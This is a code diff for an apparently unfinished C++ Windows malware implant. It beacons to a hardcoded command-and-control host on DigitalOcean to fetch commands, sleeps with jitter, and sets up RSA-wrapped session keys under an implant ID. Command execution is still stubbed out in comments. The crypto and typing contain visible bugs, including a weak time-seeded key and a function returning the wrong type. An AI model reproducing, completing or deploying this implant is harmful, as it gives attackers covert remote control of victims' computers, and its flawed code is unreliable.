@@ -7,12 +7,11 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <iostream>
 #include <windows.h>
 #include <winhttp.h>
-#include <future> 
+#include <future>
 #include <cmath>
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
 #define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"
-
 
 size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
 {
@@ -28,93 +27,89 @@ void tasks()
     }
 }
 
-
-
-BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput,ULONG pbinputsize){
+BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput, ULONG pbinputsize)
+{
     BCRYPT_ALG_HANDLE rsahandle;
-    BCryptOpenAlgorithmProvider(&rsahandle,BCRYPT_RSA_ALGORITHM,NULL,0);
-    BCRYPT_KEY_HANDLE outro=new BCRYPT_KEY_HANDLE;
-    BCryptImportKeyPair(rsahandle,NULL,BCRYPT_RSAPUBLIC_BLOB,&outro,pbinnput,pbinputsize,BCRYPT_NO_KEY_VALIDATION);
+    BCryptOpenAlgorithmProvider(&rsahandle, BCRYPT_RSA_ALGORITHM, NULL, 0);
+    BCRYPT_KEY_HANDLE outro = new BCRYPT_KEY_HANDLE;
+    BCryptImportKeyPair(rsahandle, NULL, BCRYPT_RSAPUBLIC_BLOB, &outro, pbinnput, pbinputsize, BCRYPT_NO_KEY_VALIDATION);
     return outro;
 }
-PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle,PUCHAR symkey, ULONG symkeysize){ 
-    //Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
+PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle, PUCHAR symkey, ULONG symkeysize)
+{
+    // Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
     ULONG encbuffersize;
-    NTSTATUS status = BCryptEncrypt(rsakeyhandle,
-    symkey,
-    symkeysize,
-    NULL,
-    NULL,
-    0,
-    NULL,
-    0,
-    &encbuffersize,
-    0);
+    NTSTATUS status = BCryptEncrypt(rsakeyhandle, symkey, symkeysize,NULL,NULL,0,NULL,0,&encbuffersize,0);
     PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
-    if (encbuffer == NULL) {
+    if (encbuffer == NULL)
+    {
         printf("failed to allocate memory for blindedFEKBuffer\n");
     }
-    BCryptEncrypt(rsakeyhandle,symkey,symkeysize,NULL,NULL,0,encbuffer,encbuffersize,&encbuffersize,0);
+    BCryptEncrypt(rsakeyhandle, symkey, symkeysize, NULL, NULL, 0, encbuffer, encbuffersize, &encbuffersize, 0);
     return encbuffer;
 }
-char* getsecret(){
-    char* secret=(char*)malloc(8);
-    std::string alphabet="abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
-    unsigned int ms =std::time(nullptr);
-    double mod=61;
+char *getsecret()
+{
+    char *secret = (char *)malloc(8);
+    std::string alphabet = "abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    unsigned int ms = std::time(nullptr);
+    double mod = 61;
     srand(ms);
-    for(int i=0;i<8;i++){
-        if(i==4){
-            srand(ms+1);
+    for (int i = 0; i < 8; i++)
+    {
+        if (i == 4)
+        {
+            srand(ms + 1);
         }
-        int randomvalue=std::fmod(rand(),mod);
-        secret[i]=alphabet[randomvalue];
+        int randomvalue = std::fmod(rand(), mod);
+        secret[i] = alphabet[randomvalue];
     }
     return secret;
 }
 
- BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey){
+BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey)
+{
     BCRYPT_ALG_HANDLE ahandle;
-    BCRYPT_KEY_HANDLE symkeyhandle = new BCRYPT_KEY_HANDLE;
+    BCRYPT_KEY_HANDLE symkeyhandle;
     ULONG symkeypropertylen;
     ULONG bytescopied;
-    BCryptOpenAlgorithmProvider(&ahandle,BCRYPT_AES_GMAC_ALGORITHM,NULL,0);
-    
-    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
-    PUCHAR symkeylen=(PUCHAR)malloc(symkeypropertylen);
-    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,symkeylen,symkeypropertylen,&bytescopied,0);
-    //PUCHAR symkey=(PUCHAR)malloc(symkeylen);  
-    
-    /*
-    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
-    PUCHAR symkeyobjlen=(PUCHAR)malloc(symkeypropertylen);
-    BCryptGetProperty(ahandle,BCRYPT_OBJECT_LENGTH,symkeyobjlen,symkeypropertylen,&bytescopied,0);
-    PUCHAR symkeyobj=(PUCHAR)malloc((int)symkeyobjlen);
-    */
-    char* secret=getsecret();
-    BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,NULL,0,(PUCHAR)secret,8,0);
-    //BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,symkeyobj,(ULONG)symkeyobjlen,(PUCHAR)secret,8,0);
+    BCryptOpenAlgorithmProvider(&ahandle, BCRYPT_AES_GMAC_ALGORITHM, NULL, 0);
+
+    BCryptGetProperty(ahandle, BCRYPT_KEY_LENGTH, NULL, 0, &symkeypropertylen, 0);
+    PUCHAR symkeylen = (PUCHAR)malloc(symkeypropertylen);
+    BCryptGetProperty(ahandle, BCRYPT_KEY_LENGTH, symkeylen, symkeypropertylen, &bytescopied, 0);
+    char *secret = getsecret();
+    BCryptGenerateSymmetricKey(ahandle, &symkeyhandle, NULL, 0, (PUCHAR)secret, 8, 0);
     free(symkeylen);
-    return symkeyhandle;
-    }
 
 
+    //Get datablob required size
+    ULONG blobsize;
+    BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&blobsize,0);
+    //Make blob, export key to blob
+    BLOB* keyblob=(BLOB*)malloc(blobsize);
+    BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)keyblob,blobsize,&blobsize,0);
+    return keyblob;
+}
 
-std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id) {
+std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id)
+{
     // Used Windows documentation for every function
     int temp = 0;
     // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
-    if(implant_id>10){
+    if (implant_id > 10)
+    {
         temp = 2;
-    }else{
-        temp=1;
+    }
+    else
+    {
+        temp = 1;
     }
     int length = 7 + temp;
     char postdata[11];
     sprintf(postdata, "{\"id\":%d}", implant_id);
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
-
 
     /* Converts from string to wstring to LPCWSTR
        https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
@@ -126,17 +121,18 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int imp
     // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
     HINTERNET hSession = WinHttpOpen(fqdnptr, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
-    if (!hSession) {
+    if (!hSession)
+    {
         return "WinHttpOpen Failed";
     }
 
     // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
     HINTERNET hConnect = WinHttpConnect(hSession, fqdnptr, port, 0);
 
-    if (!hConnect) {
+    if (!hConnect)
+    {
         WinHttpCloseHandle(hSession);
         return "WinHttpConnect Failed";
-
     }
 
     // GET string for WinHttpOpenRequest
@@ -150,37 +146,41 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int imp
     // The WinHttpOpenRequest function creates an HTTP request handle.
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
 
-    if (!hRequest) {
+    if (!hRequest)
+    {
         WinHttpCloseHandle(hSession);
         WinHttpCloseHandle(hConnect);
         return "WinHttpOpenRequest Failed";
     }
-    //WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);
+    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);
 
     // The WinHttpSendRequest function sends the specified request to the HTTP server.
-    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0)) {
+    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
+    {
         WinHttpCloseHandle(hSession);
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hRequest);
         return "WinHttpSendRequest Failed";
     }
 
-    if (!WinHttpReceiveResponse(hRequest, NULL)) {
+    if (!WinHttpReceiveResponse(hRequest, NULL))
+    {
         WinHttpCloseHandle(hSession);
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hRequest);
         return "WinHttpReceiveResponse Failed";
     }
 
-
     DWORD lpdwNumberOfBytesAvailable = 0;
     LPSTR lpBuffer = NULL;
 
-    do {
+    do
+    {
 
         lpdwNumberOfBytesAvailable = 0;
 
-        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable)) {
+        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
+        {
             WinHttpCloseHandle(hSession);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hRequest);
@@ -193,7 +193,8 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int imp
 
         DWORD lpdwNumberOfBytesRead = 0;
 
-        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead)) {
+        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
+        {
             WinHttpCloseHandle(hSession);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hRequest);
@@ -209,7 +210,6 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int imp
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hRequest);
     return result;
-
 }
 
 // -> PARSE TASK IS FINISHED IN PARSE.CPP
@@ -218,53 +218,54 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int imp
 // return 1;
 // }
 
-//TODO
-// auto executeTasks(auto tasks){
-    
+// TODO
+//  auto executeTasks(auto tasks){
+
 //     return 1;
 // }
 
-
-std::string getTasks(int implant_id){
+std::string getTasks(int implant_id)
+{
     std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
     return item;
 }
 
-void runLoop(bool isRunning){
-    while (isRunning) {
-        try {
-            //WAS FOR TESTING PURPOSES - CHANGE LATER
-            int implant_id = 1;
+void runLoop(int implant_id)
+{
+    int jitter;
+    int i=0;
+    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)serverpublickey,(ULONG)562);
+    BCRYPT_KEY_HANDLE symkey=newsymkey(rsakey);
+    //char* encbuffer=rsaEncrypt(rsakey,);
+    //register()
+    while (true)
+    {
+        try
+        {
+            i+=1;
+            if(i==40){
+                newsymkey(rsakey);
+                i=0;
+            }
+
+            // WAS FOR TESTING PURPOSES - CHANGE LATER
             std::string getting = getTasks(implant_id);
-
+            jitter = rand() * 10;
+            Sleep(SLEEP + jitter);
             std::cout << getting << std::endl;
-            //WHEN WE GET THE FORMAT, THEN PARSE
-            //THEN AFTER PARSE FEED INTO EXECUTE
+            // WHEN WE GET THE FORMAT, THEN PARSE
+            // THEN AFTER PARSE FEED INTO EXECUTE
 
-            //const auto serverResponse = std::async(std::launch::async, getTasks);
-            //auto parsedTasks = parseTasks(serverResponse.get());
-            //auto success = executeTasks(parsedTasks);
+            // const auto serverResponse = std::async(std::launch::async, getTasks);
+            // auto parsedTasks = parseTasks(serverResponse.get());
+            // auto success = executeTasks(parsedTasks);
         }
-        catch (const std::exception& e) {
+        catch (const std::exception &e)
+        {
             printf("\nError in runLoop: %s\n", e.what());
         }
 
-        //SET SLEEP HERE 
-}
-
-}
-
-// TO DO - UNSURE OF WHAT THIS IS. IS THIS POSTING BACK TO C2?
-int sendresults()
-{
-    while (1)
-    {
-        //create jitter from 0 to 5 mins 
-        int jitter;
-        jitter=rand()*10; 
-        Sleep(SLEEP+jitter);
-        // Send results, check response
-        // If good response break
+        // SET SLEEP HERE
     }
 }
 
@@ -299,22 +300,16 @@ char *make_base_payload(char *implant_id)
 
 int main(int argc, char *argv[])
 {
-    runLoop(true);
+
+
+
+    //int implant_id = get_id();
+    int implant_id=0;
+    runLoop(implant_id);
     return 0;
 }
 
-
-
-
-
-
-
-
-
-
-
-
-/* Code not used 
+/* Code not used
 
 
 LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
@@ -410,14 +405,14 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                 WINHTTP_FLAG_SECURE);
             if (request != NULL)
-            {   
-               
-                
+            {
+
+
                 if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                     printf("YOU SET HEADER");
                 }
 
-        
+
                 BOOL idrequest = WinHttpSendRequest(
                     request,
                     WINHTTP_NO_ADDITIONAL_HEADERS,
